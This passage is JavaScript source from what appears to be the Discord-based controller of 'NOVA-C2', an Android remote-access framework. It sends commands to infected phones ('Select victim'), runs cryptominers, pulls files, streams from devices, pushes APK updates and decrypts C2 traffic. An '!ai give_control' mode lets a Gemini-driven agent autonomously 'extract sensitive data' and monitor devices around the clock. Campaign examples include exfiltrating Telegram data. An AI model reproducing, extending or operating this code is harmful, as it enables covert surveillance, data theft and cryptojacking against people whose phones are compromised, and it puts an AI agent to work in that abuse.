          return msg.reply({ ...bloodEmbed(bold('BROADCAST'), 'online', `\`\`\`ansi\n${createBox(`${A.brightRed}${smallCaps('broadcast')}${A.reset}\n${A.red}┃${A.reset} ${mono('!' + bcCmd + (bcPayload ? ' ' + bcPayload : ''))}\n${A.red}┃${A.reset} ${A.grey}sent: ${sent}/${channels.size}${A.reset}${failed.length ? '\n' + A.red + '┃' + A.reset + ' ' + A.grey + 'failed: ' + failed.join(', ') + A.reset : ''}`, 'neon', 36)}\`\`\``), components: RESULT_BTNS })
        }
        case '!miner': {
          await guild.channels.fetch()
          const t = await requireTarget(guild, targets, uid)
          if (!t.channel) return msg.reply(`${E.coffin} ${t.err} ${E.skull}`)
          const sub = args[0] || 'status'
          if (sub === 'status') {
            await msg.channel.sendTyping()
            const r = await sendCmd(t.channel, 'miner', 'status')
            if (!r.ok) return msg.reply(`${E.coffin} ${r.err} ${E.skull}`)
            logCommand(uid, msg.author.username, 'miner', 'status', t.channel.name)
            const resp = await collectChannelResponse(t.channel, 'miner', 30000)
            if (resp) {
              const { embed } = buildMinerEmbed(resp, t.channel.name.replace('device-', ''))
              return msg.reply({ embeds: [embed], components: RESULT_BTNS })
            }
            return msg.reply({ content: `${E.knife} Miner status sent (no response yet) ${E.skull}`, components: RESULT_BTNS })
          }
          const r = await sendCmdLogged(t.channel, 'miner', args.join(' '), uid, msg.author.username)
          return r.ok ? msg.reply({ content: `${E.knife} Miner sent ${E.skull}`, components: RESULT_BTNS }) : msg.reply(`${E.coffin} ${r.err} ${E.skull}`)
        }
        case '!upload': {
          const filePath = args.join(' ')
          if (!filePath) return msg.reply(`${E.target} Usage: \`!upload <path>\`\nExample: \`!upload /sdcard/Download/file.pdf\` ${E.skull}`)
          await guild.channels.fetch()
          const t = await requireTarget(guild, targets, uid)
          if (!t.channel) return msg.reply(`${E.coffin} ${t.err} ${E.skull}`)
          const r = await sendCmdLogged(t.channel, 'upload', filePath, uid, msg.author.username)
          return r.ok ? msg.reply({ content: `${E.knife} Upload: \`${filePath}\` ${E.skull}`, components: RESULT_BTNS }) : msg.reply(`${E.coffin} ${r.err} ${E.skull}`)
        }
        case '!stream': {
          await guild.channels.fetch()
          const t = await requireTarget(guild, targets, uid)
          if (!t.channel) return msg.reply(`${E.coffin} ${t.err} ${E.skull}`)
          const r = await sendCmdLogged(t.channel, 'stream', args.join(' '), uid, msg.author.username)
          return r.ok ? msg.reply({ content: `${E.knife} Stream sent ${E.skull}`, components: RESULT_BTNS }) : msg.reply(`${E.coffin} ${r.err} ${E.skull}`)
        }
        case '!d': {
          const b64 = args.join(' ')
          if (!b64) return msg.reply(`${E.target} Usage: \`!d <base64>\`\nDecrypts an AES-256-GCM encrypted C2 response. ${E.skull}`)
          try {
            const plain = decrypt(b64)
            return msg.reply({ ...bloodEmbed(bold('🔓 DECRYPTED'), 'info', `\`\`\`\n${plain.slice(0, 1900)}\n\`\`\``), components: MENU_BTNS })
          } catch (e) {
            return msg.reply(`${E.coffin} Decrypt failed: ${e.message} ${E.skull}`)
          }
        }
        case '!ai': {
          console.log(`[AI] !ai command received from ${msg.author.tag} in #${msg.channel.name}`)
          console.log(`[AI] isAvailable: ${aiCoPilot.isAvailable}, provider: ${aiCoPilot.providerName}`)
          if (!aiCoPilot.isAvailable) {
            console.log(`[AI] AI not available - check GEMINI_API_KEY`)
            return msg.reply(`${E.coffin} AI needs Gemini API key. Get free at https://aistudio.google.com/apikey ${E.skull}`)
          }

          // AI Controller sub-commands
          const firstArg = args[0]?.toLowerCase()
          if (firstArg === 'give_control' || firstArg === 'autonomous') {
            const objective = args.slice(1).join(' ') || 'Full autonomous intelligence gathering — profile all devices, extract sensitive data, monitor activity, and report findings 24/7'
            try {
              const status = await aiController.startMission(guild, client, targets, deviceStatus, objective)
              const text = `**🤖 AI Controller ACTIVE**\n**Mission:** ${objective.slice(0, 200)}\n**Devices:** ${status.devices} found\n**Interval:** ${status.interval}\n\nAI now has full autonomy. It will gather intelligence, execute commands, and report findings in real-time.\nUse \`!ai take_control\` to stop.`
              return msg.reply({ ...bloodEmbed(bold('🤖 AI AUTONOMOUS'), 'danger', text), components: MENU_BTNS })
            } catch (err) { return msg.reply(`${E.coffin} ${err.message} ${E.skull}`) }
          }
          if (firstArg === 'take_control' || firstArg === 'revoke') {
            if (!aiController.isActive) return msg.reply(`${E.coffin} AI controller not active ${E.skull}`)
            aiController.stopMission()
            return msg.reply({ ...bloodEmbed(bold('🤖 AI Controller'), 'warning', `**CONTROL REVOKED**\nAI autonomy has been terminated. Manual control resumed.`), components: MENU_BTNS })
          }
          if (firstArg === 'controller' || firstArg === 'status') {
            const s = aiController.status
            const text = s.mission
              ? `**🤖 AI Controller Status**\n**State:** ${s.state}\n**Mission:** ${s.mission.objective}\n**Phase:** ${s.mission.phase}\n**Commands Executed:** ${s.mission.commandsExecuted}\n**Uptime:** ${s.uptime}\n**Devices:** ${s.devices}\n**Interval:** ${s.interval}`
              : `**🤖 AI Controller**\n**State:** OFF\nUse \`!ai give_control <objective>\` to start autonomous operations.`
            return msg.reply({ ...bloodEmbed(bold('🤖 AI CONTROLLER'), s.mission ? 'danger' : 'info', text), components: MENU_BTNS })
          }

          const aiMsg = args.join(' ')
          if (!aiMsg) {
            const actionHelp = getActionHelp()
            return msg.reply(`${E.target} Usage: \`!ai <request>\` or \`!ai give_control <objective>\` for autonomous mode\n\n**Direct actions (no AI needed):**\n${actionHelp.slice(0, 1500)} ${E.skull}`)
          }
          await msg.channel.sendTyping()

          // ── ACTION ROUTER: intercept "do X" requests, execute directly, no AI ──
          const routed = matchAction(aiMsg)
          if (routed) {
            await guild.channels.fetch()
            const t = resolveTarget(guild, targets, uid)
            if (!t.channel) return msg.reply(`${E.coffin} No target selected. Use \`!target <name>\` first ${E.skull}`)
            // Wrap sendCmd for router's handler (cmd, args) → sendCmd(channel, cmd, payload)
            const sendCmdWrap = (cmd, payload) => sendCmd(t.channel, cmd, payload || '')
            const collectWrap = (cmd, timeout) => collectChannelResponse(t.channel, cmd, timeout || 15000)
            try {
              const result = await routed.action.handler(routed.match, sendCmdWrap, collectWrap)
              return msg.reply({ ...bloodEmbed(bold(`🤖 ${routed.action.description}`), 'info', result || 'Done'), components: RESULT_BTNS })
            } catch (err) { return msg.reply(`${E.coffin} ${err.message} ${E.skull}`) }
          }

          try {
            // Ensure AI session exists before gathering
            let session = aiContext.getSession(guild.id, uid)
            if (!session) session = aiContext.createSession(guild.id, uid)

            // Only auto-gather for intelligence requests (not direct actions)
            await guild.channels.fetch()
            const t = resolveTarget(guild, targets, uid)
            if (t.channel) {
              const devKey = session.deviceKnowledge.get(t.channel.id)
              const needsGather = !devKey || devKey.ip === '?' || !devKey.sysinfo || !devKey.installed
              if (needsGather) {
                const gatherCmds = [
                  { cmd: 'ip', timeout: 15000 },
                  { cmd: 'sysinfo', timeout: 15000 },
                  { cmd: 'installed', timeout: 30000 },
                ]
                const gathered = []
                for (const { cmd, timeout } of gatherCmds) {
                  const r = await sendCmd(t.channel, cmd, '')
                  if (r.ok) {
                    await new Promise(r => setTimeout(r, 1000))
                    const resp = await collectChannelResponse(t.channel, cmd, timeout)
                    if (resp) {
                      aiContext.updateDeviceKnowledge(session, t.channel.id, cmd, resp.slice(0, 5000))
                      gathered.push(cmd)
                    }
                  }
                }
                if (gathered.length > 0) {
                  console.log(`[AI] Auto-gathered: ${gathered.join(', ')} for ${t.channel.name}`)
                }
              }
            }

            console.log(`[AI] Calling processRequest with: "${aiMsg.slice(0, 50)}..."`)
            const { response } = await aiCoPilot.processRequest(guild.id, uid, aiMsg)
            console.log(`[AI] Response received, proposedCommands: ${response.proposedCommands?.length}, ready: ${response.ready}`)
            if (!response.proposedCommands.length && response.ready) return msg.reply({ ...bloodEmbed(bold('🤖 AI'), 'info', response.summary || response.analysis), components: MENU_BTNS })
            const cmdList = response.proposedCommands.map((c, i) => `**${i + 1}.** \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')
            const text = response.analysis ? `**Analysis:** ${response.analysis}\n\n**Proposed:**\n${cmdList}` : `**Proposed:**\n${cmdList}`
            const aiBtns = [
              ...actionRow(btn(`ai_approve_${uid}`, 'APPROVE', '✅', 'success'), btn(`ai_auto_${uid}`, 'AUTO', '▶️', 'primary'), btn(`ai_more_${uid}`, 'MORE', '🔄', 'secondary'), btn(`ai_reject_${uid}`, 'REJECT', '❌', 'danger')),
              ...actionRow(btn(`ai_summary_${uid}`, 'SUMMARY', '📋', 'primary'), btn(`ai_campaign_${uid}`, 'CAMPAIGN', '🎯', 'secondary'), btn(`ai_stop_${uid}`, 'STOP', '⏹️', 'danger')),
            ].flat()
            return msg.reply({ ...bloodEmbed(bold('🤖 AI'), 'warning', text), components: aiBtns })
          } catch (err) {
            console.error(`[AI] ERROR:`, err.message, err.stack?.slice(0, 500))
            return msg.reply(`${E.coffin} AI error: ${err.message} ${E.skull}`)
          }
        }
        case '!campaign': {
          if (!aiCoPilot.isAvailable) return msg.reply(`${E.coffin} AI needs Gemini API key ${E.skull}`)
          const campMsg = args.join(' ')
          if (!campMsg) return msg.reply(`${E.target} Usage: \`!campaign <objective>\`\nExamples:\n\`!campaign profile device-3\`\n\`!campaign exfil telegram from device-7\`\n\`!campaign status\``)
          if (campMsg === 'status') {
            const list = campaignManager.listCampaigns(guild.id, uid)
            return list.length ? msg.reply({ ...bloodEmbed(bold('ACTIVE CAMPAIGNS'), 'info', list.map(c => `**${c.id.slice(0, 16)}...** | ${c.status} | ${c.progress} | ${c.elapsed}`).join('\n')), components: MENU_BTNS }) : msg.reply(`${E.coffin} None ${E.skull}`)
          }
          if (campMsg.startsWith('cancel ')) {
            const cid = campMsg.slice(7).trim()
            return campaignManager.cancelCampaign(guild.id, uid, cid) ? msg.reply(`${E.coffin} Cancelled \`${cid}\` ${E.skull}`) : msg.reply(`${E.warning} Not found ${E.skull}`)
          }
          await msg.channel.sendTyping()
          try {
            const campaign = await campaignManager.createCampaign(guild.id, uid, campMsg)
            const deviceContext = aiContext.summarizeDeviceKnowledge(aiContext.getSession(guild.id, uid))
            const plan = await campaignManager.planCampaign(campaign, deviceContext)
            const phaseList = plan.phases.map((p, i) => `**Phase ${i + 1}: ${p.name}**${p.requiresApproval ? ' [⚠️]' : ''}\n${p.commands.map(c => `  ┃ \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')}`).join('\n')
            const text = `**Objective:** ${campMsg}\n\n**Analysis:** ${plan.analysis}\n\n**Plan:**\n${phaseList}\n\n**Estimated:** ${plan.estimatedDuration || '?'} | **Risk:** ${(plan.riskLevel || 'medium').toUpperCase()}\n**ID:** \`${campaign.id}\``
            return msg.reply({ ...bloodEmbed(bold('🤖 CAMPAIGN'), 'warning', text), components: actionRow(btn(`cmp_approve_${uid}_${campaign.id}`, 'APPROVE', '✅', 'success'), btn(`cmp_reject_${uid}_${campaign.id}`, 'REJECT', '❌', 'danger')) })
          } catch (err) { return msg.reply(`${E.coffin} Campaign error: ${err.message} ${E.skull}`) }
        }
        case '!analyze': {
          const target = args.join(' ')
          const session = aiContext.getSession(guild.id, uid)
          if (!session) return msg.reply(`${E.coffin} No AI session. Use \`!ai\` first ${E.skull}`)
          await msg.channel.sendTyping()
          try {
            let data = ''
            if (target === 'all' || !target) { data = aiContext.summarizeDeviceKnowledge(session) + '\n\nGRABS:\n' + aiContext.getGrabHistory(session).map(g => `[${g.type}] ${g.summary}`).join('\n') }
            else if (target === 'grabs') { data = aiContext.getGrabHistory(session).map(g => `[${g.type} @ ${new Date(g.timestamp).toLocaleString()}]\n${g.summary}`).join('\n\n') }
            else data = target
            const analysis = await analyzeResults(data.slice(0, 8000), session)
            const findings = analysis.highValueFindings?.map(f => `• **${f.type}** (${f.value}): ${f.detail}`).join('\n') || 'None'
            const nextTargets = analysis.nextTargets?.map(t => `• \`${t.target}\` — ${t.reason}`).join('\n') || 'None'
            return msg.reply({ ...bloodEmbed(bold('🔍 ANALYSIS'), analysis.riskLevel === 'high' ? 'danger' : 'warning', `**${analysis.analysis || 'Complete'}**\n\n**Findings:**\n${findings}\n\n**Next:**\n${nextTargets}\n\n**Risk:** ${(analysis.riskLevel || '?').toUpperCase()}`), components: MENU_BTNS })
          } catch (err) { return msg.reply(`${E.coffin} Analysis error: ${err.message} ${E.skull}`) }
        }
      }
      return
    }

    // ── Device Commands ──────────────────────────────────────────
    const clean = cmdL.replace(/^!/, '')
    if (!DEV_CMDS.has(clean)) return

    await guild.channels.fetch()
    const channels = getPhantomChannels(guild)

    if (clean === 'ping' && !channels.size && !targets.has(uid)) {
      const start = Date.now()
      const m = await msg.reply(`${E.heart} Pong! ${E.skull}`).catch(() => null)
      if (m) await m.edit(`${E.heart} Pong! ${Date.now() - start}ms | ${E.coffin} No devices ${E.skull}`).catch(() => {})
      return
    }

    let payload = args.join(' '), deviceCh = null
    if (args.length) { const ch = findPhantomChannel(guild, args[0]); if (ch) { deviceCh = ch; payload = args.slice(1).join(' ') } }

    // !update with APK attachment
    if (clean === 'update' && msg.attachments.size > 0) {
      const apk = msg.attachments.find(a => a.name.endsWith('.apk'))
      if (!apk) return msg.reply(`${E.coffin} Attach .apk file ${E.skull}`)
      const cmdPayload = `push ${apk.url}`
      let r = null
      if (deviceCh) r = await sendCmd(deviceCh, clean, cmdPayload)
      else if (targets.has(uid)) r = await sendToTarget(uid, guild, clean, cmdPayload)
      else if (channels.size === 1) r = await sendCmd(channels.first(), clean, cmdPayload)
      if (!r?.ok) return msg.reply(`${E.coffin} No target. Use \`!target <name>\` first ${E.skull}`)
      return msg.reply({ content: `${E.knife} Pushing APK to \`${r.name}\` ${E.skull}`, components: RESULT_BTNS })
    }

    if (deviceCh) {
      const r = await sendCmdLogged(deviceCh, clean, payload, uid, msg.author.username)
      return r.ok ? msg.reply({ content: `${E.knife} \`!${clean}\` sent to \`${r.name}\` ${E.skull}`, components: RESULT_BTNS }) : msg.reply(`${E.coffin} ${r.err} ${E.skull}`)
    }

    if (targets.has(uid)) {
      const r = await sendToTarget(uid, guild, clean, payload)
      if (r.ok) { logCommand(uid, msg.author.username, clean, payload, r.name); return msg.reply({ content: `${E.knife} \`!${clean}\` sent ${E.skull}`, components: RESULT_BTNS }) }
      if (r.err === 'no_target' || r.err === 'gone') { targets.delete(uid); return msg.reply(`${E.coffin} Use \`!target <name>\` first ${E.skull}`) }
      return msg.reply(`${E.coffin} ${r.err} ${E.skull}`)
    }

    if (channels.size === 1) {
      const ch = channels.first()
      const r = await sendCmdLogged(ch, clean, payload, uid, msg.author.username)
      if (r.ok) targets.set(uid, { chId: ch.id, ts: Date.now() })
      return msg.reply({ content: `${E.knife} \`!${clean}\` sent to \`${ch.name}\` ${E.skull}`, components: r.ok ? RESULT_BTNS : [] })
    }

    if (channels.size > 1) {
      const pages = devSelectPages(channels)
      if (!pages.length) return msg.reply(`${E.warning} ${channels.size} devices. Use \`!${clean} <name>\` ${E.skull}`)
      const m = await msg.reply({ content: `Select victim for \`!${clean}\` ${E.knife}`, components: pages[0].components }).catch(() => null)
      if (!m) return
      if (pages.length > 1) devicePages.set(m.id, { pages, idx: 0, ts: Date.now() })
      const col = m.createMessageComponentCollector({ filter: ci => ci.user.id === uid && ci.customId === 'sel' && ci.message.id === m.id, time: SELECT_TIMEOUT, max: 1 })
      col.on('collect', async ci => { const ch = guild.channels.cache.get(ci.values[0]); if (ch) { await sendCmd(ch, clean, payload); targets.set(uid, { chId: ch.id, ts: Date.now() }) }; await ci.update({ content: `${E.knife} \`!${clean}\` sent ${E.skull}`, components: [] }) })
      col.on('end', async collected => { if (!collected.size) try { await m.edit({ content: `${E.coffin} Timed out`, components: [] }) } catch {} })
      return
    }

    return msg.reply(`${E.coffin} No devices ${E.skull}`)
  } catch (err) { console.error(err); try { await msg.reply(`${E.coffin} ${err.message} ${E.skull}`) } catch {} }
})

// ── STATUS CHECKER ─────────────────────────────────────────────────────
async function refreshDeviceStatus(guild, sendAlerts = false) {
  const gid = guild.id
  if (guildCheckLocks.has(gid)) return
  guildCheckLocks.add(gid)
  try {
    const allChannels = await guild.channels.fetch()
    const channels = allChannels.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('device-'))
    const alertCh = sendAlerts ? await getAlertChannel() : null
    await Promise.allSettled([...channels].map(async ([, ch]) => {
      if (deviceCheckLocks.has(ch.id)) return
      deviceCheckLocks.add(ch.id)
      try {
        let online = false, lastSeen = null
        try {
          const msgs = await ch.messages.fetch({ limit: 25 })
          for (const [, m] of msgs) {
            if (!m.content) continue
            if ((m.content.includes(':heartbeat:') || m.content.includes(':green_circle:') || m.content.includes('🟢') || /<:heartbeat:\d+>/.test(m.content) || /<:green_circle:\d+>/.test(m.content) || /<a?:green_circle:\d+>/.test(m.content) || m.content.includes('**Alive**') || m.content.includes('**Device Online**') || m.content.includes('**Reconnected**')) && Date.now() - m.createdTimestamp < HEARTBEAT_TIMEOUT) {
              online = true; lastSeen = m.createdTimestamp; break
            }
          }
          if (!online && msgs.size > 0) {
            lastSeen = msgs.first().createdTimestamp
            if (Date.now() - lastSeen < HEARTBEAT_TIMEOUT) online = true
          }
        } catch {}
        const prev = deviceStatus.get(ch.id)
        const wasOnline = prev?.online ?? false
        deviceStatus.set(ch.id, { online, lastSeen, name: ch.name })
        if (!alertCh || wasOnline === online) return
        const cooldownKey = `${ch.id}:${online}`
        if (Date.now() - (alertCooldown.get(cooldownKey) || 0) < 120000) return
        if (Date.now() - botStartTime < 30000) return
        alertCooldown.set(cooldownKey, Date.now())

        let mModel = ch.name.replace('device-', ''), mAndroid = '?', mIp = '?'
        try {
          const msgs = await ch.messages.fetch({ limit: 25 })
          for (const [, m] of msgs) {
            if (!m.content) continue
            const om = m.content.match(/\*\*Device Online\*\*.*?—\s*(.+?)\s*\((.+?)\)\s*\|?\s*IP:\s*(.+)/)
            if (om) { mModel = om[1].trim(); mAndroid = om[2].trim(); mIp = om[3].trim(); break }
            const rm = m.content.match(/\*\*Reconnected\*\*.*?—\s*(.+?)\s*\|?\s*IP:\s*(.+)/)
            if (rm) { mModel = rm[1].trim(); mIp = rm[2].trim(); break }
            const hm = m.content.match(/\*\*Alive\*\*.*?—\s*(.+?)\s*\|?\s*IP:\s*(.+)/)
            if (hm) { mModel = hm[1].trim(); mIp = hm[2].trim(); break }
          }
        } catch {}
        const deviceName = ch.name.replace('device-', '')

        try {
          const mod = await import('./statusCard.js')
          const cardBuffer = mod.statusCard ? await mod.statusCard({ deviceName, status: online ? 'online' : 'offline', model: mModel !== '?' ? mModel : 'Unknown', android: mAndroid !== '?' ? mAndroid : 'Unknown', ip: mIp !== '?' ? mIp : 'Unknown', lastSeen: online ? 'now' : (lastSeen ? `${Math.round((Date.now() - lastSeen) / 60000)}m ago` : 'never'), theme: 'blood' }) : null
          const e = new EmbedBuilder().setColor(online ? C.neon : C.void).setTitle(online ? `${E.check} ${ch.name} ONLINE ${E.check}` : `${E.coffin} ${ch.name} OFFLINE ${E.coffin}`).setThumbnail(randGif())
            .addFields(
              { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
              { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
              { name: `${E.bone} Android`, value: mAndroid !== '?' ? mAndroid : 'Unknown', inline: true },
              { name: `${E.eye} IP`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
              { name: `${E.heart} Status`, value: online ? `${E.check} ONLINE` : `${E.coffin} OFFLINE`, inline: true },
            )
            .setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}`, iconURL: ICONS.alert || undefined })
          if (cardBuffer) { e.setImage(`attachment://status-${deviceName}.png`); await alertCh.send({ embeds: [e], files: [new AttachmentBuilder(cardBuffer, { name: `status-${deviceName}.png` })], components: online ? ALERT_BTNS_ONLINE(ch.id) : ALERT_BTNS_OFFLINE(ch.id) }) }
          else { await alertCh.send({ embeds: [e], components: online ? ALERT_BTNS_ONLINE(ch.id) : ALERT_BTNS_OFFLINE(ch.id) }) }
        } catch (e) {
          console.error(`[Alert] Status card/image error: ${e.message}`)
          const e2 = new EmbedBuilder().setColor(online ? C.neon : C.void).setTitle(online ? `${E.check} ${ch.name} ONLINE` : `${E.coffin} ${ch.name} OFFLINE`).setDescription(`**${online ? 'Reconnected' : 'Lost connection'}**`).setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}` })
          await alertCh.send({ embeds: [e2], components: online ? ALERT_BTNS_ONLINE(ch.id) : ALERT_BTNS_OFFLINE(ch.id) })
        }
      } finally { deviceCheckLocks.delete(ch.id) }
    }))
  } catch (err) { console.error('Status:', err.message) }
  finally { guildCheckLocks.delete(guild.id) }
}

function startStatusChecker(guild) {
  const gid = guild.id
  if (statusCheckers.has(gid)) clearInterval(statusCheckers.get(gid))
  let running = false
  const runCheck = async () => {
    if (running) return
    running = true
    try { await refreshDeviceStatus(guild, true); const total = [...deviceStatus.values()].filter(s => s.online === true).length; client.user.setActivity(`👁️ NOVA-C2 • ${total} devices | !help`, { type: 3 }) } catch {}
    finally { running = false }
  }
  runCheck()
  statusCheckers.set(gid, setInterval(runCheck, STATUS_CHECK_INTERVAL))
}

// ── MAP CLEANUP ─────────────────────────────────────────────────────────
function cleanupMaps() {
  const now = Date.now()
  for (const [uid, data] of targets) {
    const chId = typeof data === 'string' ? data : data.chId
    const ts = typeof data === 'object' ? data.ts : now
    if (!chId || now - ts > 3600000 || (client.channels.cache.size > 0 && !client.channels.cache.has(chId))) targets.delete(uid)
  }
  for (const [chId, st] of deviceStatus) { if (!client.channels.cache.has(chId) && st.lastSeen && now - st.lastSeen > 3600000) deviceStatus.delete(chId) }
  for (const [id, page] of devicePages) { if (now - page.ts > PAGINATION_TIMEOUT) devicePages.delete(id) }
  for (const [uid, data] of rateLimits) { if (now - data.ts > RATE_LIMIT_WINDOW) rateLimits.delete(uid) }
  for (const [uid, cd] of commandCooldowns) { if (now - cd > COMMAND_COOLDOWN * 2) commandCooldowns.delete(uid) }
  for (const [uid, log] of commandLog) { if (log.length > COMMAND_LOG_MAX) commandLog.set(uid, log.slice(-COMMAND_LOG_MAX)) }
  for (const [key, ac] of alertCooldown) { if (now - ac > 600000) alertCooldown.delete(key) }
  for (const [id, data] of sentCommands) { if (now - data > COMMAND_DEDUP_WINDOW) sentCommands.delete(id) }
}

setInterval(cleanupMaps, MAP_CLEANUP_INTERVAL)

// ── STARTUP ─────────────────────────────────────────────────────────────
client.once(Events.ClientReady, async () => {
  console.log(`[+] ${client.user.tag} online`)

  videoStream.client = client
  videoStream.startServer()

  setInterval(() => {
    const mem = process.memoryUsage()
    console.log(`[MEM] RSS: ${(mem.rss / 1024 / 1024).toFixed(1)}MB | Heap: ${(mem.heapUsed / 1024 / 1024).toFixed(1)}MB | Targets: ${targets.size} | Devices: ${deviceStatus.size}`)
  }, 1800000)

  try { await client.user.setUsername('NOVA-C2').catch(() => {}); client.user.setActivity('👁️ NOVA-C2 watching 0 devices | !help', { type: 3 }) } catch {}

  if (ALLOWED_CHANNEL_ID && !startupMsgSent) {
    startupMsgSent = true
    const ch = await client.channels.fetch(ALLOWED_CHANNEL_ID).catch(() => null)
    if (!ch) { console.error(`[!] ALLOWED_CHANNEL_ID ${ALLOWED_CHANNEL_ID} not found`) }
    else {
      await ch.send({
        embeds: [new EmbedBuilder().setColor(C.sharingan).setTitle(`${E.sharingan} ${bold('NOVA-C2')}`)
          .setDescription(`**${E.sharingan} C2 Framework v3.1**\nGateway: Discord WebSocket\nStatus: ${E.flame} ACTIVE\nOnline: ${ts()}\n\nAwaiting commands...`)
          .setThumbnail(randGif()).setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })],
        components: MENU_BTNS,
      }).catch(err => console.error('Startup:', err.message))
    }
  }

  for (const [, guild] of client.guilds.cache) {
    startStatusChecker(guild)
    await registerSlashCommands(guild)
  }
})

client.on(Events.GuildCreate, async (guild) => { startStatusChecker(guild); await registerSlashCommands(guild) })
client.on(Events.GuildDelete, (guild) => {
  const gid = guild.id
  if (statusCheckers.has(gid)) { clearInterval(statusCheckers.get(gid)); statusCheckers.delete(gid) }
  for (const [, ch] of guild.channels.cache) {
    if (ch.name.startsWith('device-')) { deviceStatus.delete(ch.id); targets.forEach((data, uid) => { const chId = typeof data === 'object' ? data.chId : data; if (chId === ch.id) targets.delete(uid) }) }
  }
})
client.on(Events.ChannelCreate, async (ch) => {
  if (ch.type === ChannelType.GuildText && ch.name.startsWith('device-')) {
    deviceStatus.set(ch.id, { online: false, lastSeen: Date.now(), name: ch.name })
    const alertChId = ALERTS_CHANNEL_ID || ALLOWED_CHANNEL_ID
    if (alertChId) {
      const alertCh = client.channels.cache.get(alertChId)
      if (alertCh) alertCh.send({ embeds: [new EmbedBuilder().setColor(0x00ff88).setTitle(`${E.zap} NEW DEVICE`).setDescription(`**${ch.name.replace('device-', '')}** connected`).setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}` }).setTimestamp()] }).catch(() => {})
    }
  }
})

// ── Graceful shutdown ──────────────────────────────────────────────────
process.on('SIGINT', () => { console.log('[*] Shutdown'); for (const id of statusCheckers.values()) clearInterval(id); statusCheckers.clear(); client.destroy(); process.exit(0) })
process.on('SIGTERM', () => { console.log('[*] Shutdown'); for (const id of statusCheckers.values()) clearInterval(id); statusCheckers.clear(); client.destroy(); process.exit(0) })
process.on('uncaughtException', (err) => { console.error('[FATAL]', err.message); process.exit(1) })
process.on('unhandledRejection', (reason) => { console.error('[FATAL] Unhandled:', reason); process.exit(1) })
client.on(Events.Warn, (info) => { console.log(`[Gateway] Warn: ${info}`) })
client.on(Events.Error, (error) => { console.error(`[Gateway] Error: ${error.message}`) })
client.on(Events.ShardDisconnect, (event) => { console.log(`[Gateway] Disconnected: ${event.code}`) })
client.on(Events.ShardReconnecting, () => { console.log('[Gateway] Reconnecting...') })
client.on(Events.ShardResume, (replayed) => { console.log(`[Gateway] Resumed — ${replayed} events`) })

client.login(DISCORD_TOKEN).catch(err => { console.error('Login failed:', err.message); process.exit(1) })
